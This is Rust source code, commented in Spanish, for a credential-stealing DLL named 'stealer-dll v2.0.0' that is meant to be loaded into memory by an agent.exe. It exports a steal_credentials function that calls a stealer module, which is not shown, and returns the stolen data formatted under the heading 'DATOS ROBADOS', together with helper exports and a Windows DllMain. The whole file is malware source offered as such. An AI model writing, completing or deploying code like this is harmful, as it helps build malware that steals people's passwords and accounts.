// stealer-dll - DLL encriptada para robo de credenciales
// Se carga dinámicamente en memoria desde agent.exe

#![allow(non_snake_case)]

use std::os::raw::c_char;
use std::ffi::CString;
use std::panic;

mod stealer;

/// Función exportada para robar credenciales
/// Retorna un puntero a string JSON con los datos robados
/// DEBE liberarse con free_credentials_string()
#[no_mangle]
pub extern "C" fn steal_credentials() -> *mut c_char {
    // Capturar panics para no crashear el proceso principal
    let result = panic::catch_unwind(|| {
        // Ejecutar el stealer
        let stolen_data = stealer::steal_all();
        
        if stolen_data.is_empty() {
            return CString::new("ERROR:No se encontraron credenciales").unwrap().into_raw();
        }
        
        // Formatear datos
        let mut output = String::from("═══ DATOS ROBADOS ═══\n");
        output.push_str(&format!("Total: {} items encontrados\n", stolen_data.total_count()));
        output.push_str(&stolen_data.to_string());
        
        CString::new(output).unwrap().into_raw()
    });
    
    match result {
        Ok(ptr) => ptr,
        Err(_) => {
            CString::new("ERROR:Panic durante steal_credentials").unwrap().into_raw()
        }
    }
}

/// Libera el string retornado por steal_credentials()
#[no_mangle]
pub extern "C" fn free_credentials_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

/// Función de testing - retorna versión de la DLL
#[no_mangle]
pub extern "C" fn get_version() -> *mut c_char {
    CString::new("stealer-dll v2.0.0").unwrap().into_raw()
}

// DllMain (requerido para DLLs en Windows)
#[cfg(target_os = "windows")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    match fdw_reason {
        1 => {}, // DLL_PROCESS_ATTACH
        0 => {}, // DLL_PROCESS_DETACH
        _ => {}
    }
    1 // TRUE
}
